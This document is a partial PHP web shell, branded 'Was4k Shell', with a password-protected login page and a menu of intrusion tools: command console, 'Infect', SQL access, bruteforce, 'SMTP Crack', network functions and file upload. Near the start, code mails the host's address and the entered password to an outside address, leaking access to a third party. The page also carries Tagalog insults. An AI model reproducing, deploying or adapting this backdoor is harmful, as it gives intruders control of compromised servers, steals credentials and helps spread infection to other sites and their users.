...
if(array_key_exists('watching',$_POST)){
	$tmp = $_SERVER['SERVER_NAME'].$_SERVER['PHP_SELF']."\n".$_POST['pass']; @mail('holythings69.com', 'root', $tmp); // Edit or delete!
}
//-----------------Password---------------------
$▛ = "34d4ac0003e280f02686acfd61175aea";
$▘ = true;
$▜ = 'UTF-8';
$▚ = 'FilesMan';
...
function hardLogin() {
	...
	die("</br></br><pre align=center><img src='https://z-m-scontent.fmnl3-1.fna.fbcdn.net/v/t1.0-9/fr/cp0/e15/q65/14956602_1814114215544751_3064172301434005699_n.jpg?_nc_cat=106&efg=eyJpIjoibyJ9&_nc_eui2=AeEPfF5y6fTPKAhGnnH1tibKrG_WRheff25AbjsP86sbIgdK4wrl5jNJl-uHyGpUiGJiyATX7VWSprnG9IvdMX5MWyrjTuxicC7K-SqBceOy-w&_nc_oc=AQmWkVO6_pehytq7J0nyy-b0mMzWH6aEEq7EwputnKDxmf8rROaYIyzcOkOn54NiqzU&_nc_ad=z-m&_nc_cid=1119&_nc_zor=9&_nc_eh=76d6ed3a92d1b0bad49339947d008373&_nc_ht=z-m-scontent.fmnl3-1.fna&oh=a3f53b93880e79191774da4eac5f89a8&oe=5E3F9396' height='150' alt='250' class='rotate'><style>img {
...
</style><form method=post style='font-family:Nunito, sans-serif;color:#1a1a1a; text-shadow: 2px 0 0 #0d52bf, -2px 0 0 #0d52bf, 0 2px 0 #0d52bf, 0 -2px 0 #0d52bf, 1px 1px #0d52bf, -1px -1px 0 #0d52bf, 1px -1px 0 #0d52bf, -1px 1px 0 #0d52bf; text-align: center;'><h3>Was4k Shell <br>Script kiddie ng putanginang Cyber world niyo ./.</h3><br><input placeholder='tite' type=password name=pass style='border-radius: 4px 0px 0px 4px; background-color:whitesmoke;border:1px solid #FFF;outline:none;' required><input type=submit name='watching' value='>>' style='height: 20px; border: none; border-radius: 0px 4px 4px 0px;background-color:#0d52bf;color:#fff;cursor:pointer;'></form></pre>
...
<input type=hidden name=charset>
	...
	$m = array('Sec. Info'=>'SecInfo','Files'=>'FilesMan','Console'=>'Console','Infect'=>'Infect','Sql'=>'Sql','Php'=>'Php','Safe mode'=>'SafeMode','String tools'=>'StringTools','Bruteforce'=>'Bruteforce','SMTP Crack'=>'Smtp','Network'=>'Network');
	if(!empty($GLOBALS['▛']))
	$m['Logout'] = 'Logout';
 ...
 <font color="gray" size="24"> Was4k <font color="red" size="24">Shell </font></font><br>
 <hr>
...
<table class=info id=toolsTbl cellpadding=3 cellspacing=0 width=100%>
	<tr>
		...
		<span>Upload file:</span>$is_writable<br><input class='toolsInp' type=file name=f[]  multiple><input type=submit value='submit'></form></td>
	</tr></table>		<hr>
	<center><font color='gray'> @WAs4K 2017</font></center></div>
...
function actionLogout() {
	...
	die("<div align='center'><div class='container'><div class='sky'><div class='text'>WAG LEECH PUTANGINANIYO BENTE KWATRO ./. 
		-was4kTeam</div><div class='stars'></div><div class='stars1'></div><div class='stars2'></div><div class='shooting-stars'></div></div></div></div>
...
echo '<h1>SMTP Crack</h1>';
echo '<div class=content><table> <font color="green">IF NOTHING, Then Theres no SMTP Credentials Here :></font></div></table>';
